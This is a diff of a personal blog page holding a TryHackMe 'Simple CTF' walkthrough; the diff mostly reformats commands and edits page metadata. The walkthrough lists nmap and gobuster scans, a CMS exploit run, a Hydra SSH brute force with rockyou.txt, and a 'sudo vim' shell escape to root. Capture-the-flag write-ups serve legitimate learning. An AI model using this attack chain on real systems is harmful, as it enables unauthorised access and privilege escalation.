@@ -8,16 +8,18 @@
   
 ><head>
   <title>
-    
+    .:: Alan Cortez
+        |
+        Walkthrough: Simple CTF - TryHackMe.
       
-        Walkthrough: Simple CTF - TryHackMe. |
-      Alan Cortez
+
+    
 
   </title>
 
   
   <meta charset="utf-8" /><meta name="generator" content="Hugo 0.92.2" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
-  <meta name="author" content="Alan Cortez" />
+  <meta name="author" content=".:: Alan Cortez" />
   <meta
     name="description"
     content="Cyber security enthusiast. Constantly looking for ways to improve my skills and knowledge. I am a fast learner and always ready to take on new challenges. I am currently deepening my knowledge in Python language."
@@ -160,19 +162,19 @@
         },
         "author" : {
             "@type": "Person",
-            "name": "Alan Cortez"
+            "name": ".:: Alan Cortez"
         },
         "creator" : {
             "@type": "Person",
-            "name": "Alan Cortez"
+            "name": ".:: Alan Cortez"
         },
         "accountablePerson" : {
             "@type": "Person",
-            "name": "Alan Cortez"
+            "name": ".:: Alan Cortez"
         },
         "copyrightHolder" : {
             "@type": "Person",
-            "name": "Alan Cortez"
+            "name": ".:: Alan Cortez"
         },
         "copyrightYear" : "2023",
         "dateCreated": "2023-11-16T00:24:52.00Z",
@@ -180,7 +182,7 @@
         "dateModified": "2023-11-16T00:24:52.00Z",
         "publisher":{
             "@type":"Organization",
-            "name": "Alan Cortez",
+            "name": ".:: Alan Cortez",
             "url": "https://alan.com.ar",
             "logo": {
                 "@type": "ImageObject",
@@ -200,7 +202,7 @@
 
     ,
         "url" : "https:\/\/alan.com.ar\/post\/simplectf\/",
-        "wordCount" : "246",
+        "wordCount" : "252",
         "genre" : [ ],
         "keywords" : [ 
       
@@ -276,18 +278,7 @@
     <ul class="sidebar__list">
       
         <li class="sidebar__list-item">
-          <a
-            href="https://www.linkedin.com/in/alan-ian-cortez/"
-            target="_blank"
-            rel="noopener me"
-            aria-label="Linkedin"
-            title="Linkedin"
-          >
-            <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
-          </a>
-        </li>
-      
-        <li class="sidebar__list-item">
+
           <a
             href="https://github.com/athekat/"
             target="_blank"
@@ -298,8 +289,38 @@
             <i class="fab fa-github fa-2x" aria-hidden="true"></i>
           </a>
         </li>
+
       
         <li class="sidebar__list-item">
+
+          <a
+            href="https://tryhackme.com/p/athekat"
+            target="_blank"
+            rel="noopener me"
+            aria-label="TryHackMe"
+            title="TryHackMe"
+          >
+            <i class="fas fa-cloud fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+        <li class="sidebar__list-item">
+
+          <a
+            href="https://www.linkedin.com/in/alan-ian-cortez/"
+            target="_blank"
+            rel="noopener me"
+            aria-label="Linkedin"
+            title="Linkedin"
+          >
+            <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+          </a>
+        </li>
+
+      
+        <li class="sidebar__list-item">
+
           <a
             href="mailto:contactme@alan.com.ar"
             target="_blank"
@@ -310,6 +331,7 @@
             <i class="fas fa-envelope fa-2x" aria-hidden="true"></i>
           </a>
         </li>
+
       
       
     </ul>
@@ -373,23 +395,6 @@
         
 
       
-        
-        
-          <li class="nav__list-item">
-            
-            <a
-              
-              href="https://www.alan.com.ar/images/CV_ALAN_EN.pdf"
-              
-                target="_blank" rel="noopener noreferrer"
-              
-              title=""
-              >CV</a
-            >
-          </li>
-        
-
-      
     </ul>
     <ul class="nav__list nav__list--end">
       
@@ -437,10 +442,9 @@
 <p><a href="https://tryhackme.com/room/easyctf">Link to the room</a></p>
 </blockquote>
 <p>As usual, the first step is to run nmap to find open ports.</p>
-<blockquote>
-<p>nmap -sV machine-ip</p>
-</blockquote>
-<p>Results:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$nmap</span> -sV machine-ip
+</code></pre></div><p>Results:</p>
 <blockquote>
 <table>
 <thead>
@@ -472,10 +476,9 @@
 <p>This will solve the first two questions.</p>
 <p>Then we are asked for the CVE to use against the application.</p>
 <p>I run GoBuster to find out the directories of our target.</p>
-<blockquote>
-<p>gobuster dir -u http://&lsquo;machine-ip&rsquo; -w /usr/share/dirb/wordlists/common.txt</p>
-</blockquote>
-<p>Results</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$gobuster</span> dir -u http://<span class="s1">&#39;machine-ip&#39;</span> -w /usr/share/dirb/wordlists/common.txt
+</code></pre></div><p>Results</p>
 <blockquote>
 <ul>
 <li>/index</li>
@@ -485,29 +488,25 @@
 <p>The /simple dir has a CVE. I did a bit of googling to find the CVE number, type of attack and exploit.</p>
 <p>Using the exploit I found the username.</p>
 <p>Exploit</p>
-<blockquote>
-<p>python3 exploit.py -u http://machine-ip/simple -w list.txt -c</p>
-</blockquote>
-<p>I struggled a bit to run the exploit, got a couple of errors, but I ended up getting the username.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$python3</span> exploit.py -u http://machine-ip/simple -w list.txt -c
+</code></pre></div><p>I struggled a bit to run the exploit, got a couple of errors, but I ended up getting the username.</p>
 <p>However, the password took ages and couldn&rsquo;t get it. Instead I used Hydra:</p>
-<blockquote>
-<p>hydra -l mitch -P rockyou.txt ssh://machine-ip:2222</p>
-</blockquote>
-<blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$hydra</span> -l mitch -P rockyou.txt ssh://machine-ip:2222
+</code></pre></div><blockquote>
 <p>password found: secret</p>
 </blockquote>
 <p>With this information we can log in using ssh.</p>
-<blockquote>
-<p>ssh mitch@machine-ip -p 2222.</p>
-</blockquote>
-<p>There we find a .txt with the first flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$ssh</span> mitch@machine-ip -p 2222.
+</code></pre></div><p>There we find a .txt with the first flag.</p>
 <p>Doing cd we found there&rsquo;s anothers users folder.</p>
 <p>To get the root flag we need to check what is this allowed run as sudo using ‘sudo -l’</p>
 <p>Vim can be run as sudo and without a password.</p>
-<blockquote>
-<p>sudo vim -c &ldquo;!sh&rdquo;</p>
-</blockquote>
-<p>This gives us root privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents<span class="o">]</span>
+└─<span class="nv">$sudo</span> vim -c <span class="s2">&#34;!sh&#34;</span>
+</code></pre></div><p>This gives us root privileges.</p>
 <p>We go to the root folder to find the final flag.</p>
 
 
